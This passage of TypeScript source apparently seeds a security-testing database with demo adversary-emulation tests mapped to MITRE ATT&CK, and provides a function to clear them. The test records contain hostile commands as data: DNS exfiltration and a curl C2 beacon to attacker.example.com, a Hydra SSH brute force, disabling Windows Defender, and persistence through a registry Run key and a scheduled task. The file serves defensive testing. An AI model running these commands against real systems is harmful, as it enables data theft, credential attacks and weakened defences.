    { guid: "demo-p1q2r3s4", techniqueId: "T1566.001", techniqueName: "Phishing: Spearphishing Attachment", testName: "[DEMO] Macro-Enabled Document Execution", description: "Simulate opening a macro-enabled document for initial access.", supportedPlatforms: "windows", executorType: "powershell", executorCommand: '# Simulates macro execution from phishing attachment', elevationRequired: false, mitreTactic: "Initial Access" },
    { guid: "demo-t5u6v7w8", techniqueId: "T1547.001", techniqueName: "Boot or Logon Autostart Execution: Registry Run Keys", testName: "[DEMO] Registry Run Key Persistence", description: "Add a registry run key for persistence.", supportedPlatforms: "windows", executorType: "command_prompt", executorCommand: 'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v AtomicTest /t REG_SZ /d "C:\\test.exe" /f', cleanupCommand: 'reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v AtomicTest /f', elevationRequired: false, mitreTactic: "Persistence" },
    { guid: "demo-x9y0z1a2", techniqueId: "T1110.001", techniqueName: "Brute Force: Password Guessing", testName: "[DEMO] SSH Brute Force (Hydra)", description: "Attempt SSH brute force using Hydra.", supportedPlatforms: "linux", executorType: "bash", executorCommand: 'hydra -l #{username} -P #{wordlist} #{target_host} ssh', inputArguments: JSON.stringify({ username: { description: "Target username", type: "string", default: "admin" }, wordlist: { description: "Password wordlist path", type: "path", default: "/usr/share/wordlists/rockyou.txt" }, target_host: { description: "Target SSH host", type: "string", default: "192.168.1.1" } }), elevationRequired: false, mitreTactic: "Credential Access" },
    { guid: "demo-b3c4d5e6", techniqueId: "T1048.003", techniqueName: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol", testName: "[DEMO] DNS Exfiltration Test", description: "Simulate data exfiltration over DNS queries.", supportedPlatforms: "linux,macos", executorType: "bash", executorCommand: 'for line in $(cat #{data_file} | base64 | fold -w 60); do nslookup $line.#{dns_server}; done', inputArguments: JSON.stringify({ data_file: { description: "File to exfiltrate", type: "path", default: "/tmp/secret.txt" }, dns_server: { description: "DNS server for exfil", type: "string", default: "attacker.example.com" } }), elevationRequired: false, mitreTactic: "Exfiltration" },
    { guid: "demo-f7g8h9i0", techniqueId: "T1562.001", techniqueName: "Impair Defenses: Disable or Modify Tools", testName: "[DEMO] Disable Windows Defender", description: "Attempt to disable Windows Defender real-time protection.", supportedPlatforms: "windows", executorType: "powershell", executorCommand: 'Set-MpPreference -DisableRealtimeMonitoring $true', cleanupCommand: 'Set-MpPreference -DisableRealtimeMonitoring $false', elevationRequired: true, mitreTactic: "Defense Evasion" },
    { guid: "demo-j1k2l3m4", techniqueId: "T1071.001", techniqueName: "Application Layer Protocol: Web Protocols", testName: "[DEMO] HTTP C2 Communication Test", description: "Simulate C2 communication over HTTP.", supportedPlatforms: "linux,windows,macos", executorType: "bash", executorCommand: 'curl -s #{c2_url}/beacon -d "hostname=$(hostname)&user=$(whoami)"', inputArguments: JSON.stringify({ c2_url: { description: "C2 server URL", type: "url", default: "http://attacker.example.com" } }), elevationRequired: false, mitreTactic: "Command and Control" },
    { guid: "demo-n5o6p7q8", techniqueId: "T1053.005", techniqueName: "Scheduled Task/Job: Scheduled Task", testName: "[DEMO] Create Scheduled Task for Persistence", description: "Create a Windows scheduled task for persistence.", supportedPlatforms: "windows", executorType: "command_prompt", executorCommand: 'schtasks /create /tn "AtomicRedTeamTest" /tr "C:\\test.exe" /sc daily /st 09:00', cleanupCommand: 'schtasks /delete /tn "AtomicRedTeamTest" /f', elevationRequired: true, mitreTactic: "Persistence" },
  ];

  let seeded = 0;
  for (const test of demoTests) {
    try {
      await db.insert(atomicTests).values({
        ...test,
        inputArguments: test.inputArguments || null,
        cleanupCommand: test.cleanupCommand || null,
        dependencies: null,
        lastSyncedAt: new Date(),
      }).onDuplicateKeyUpdate({ set: { lastSyncedAt: new Date() } });
      seeded++;
    } catch { /* skip duplicates */ }
  }

  return { seeded };
}

/**
 * Clear all demo data.
 */
export async function clearDemoData(): Promise<{ deleted: number }> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");

  const result = await db.delete(atomicTests)
    .where(like(atomicTests.guid, "demo-%"));

  return { deleted: (result as any).rowsAffected || 0 };
}
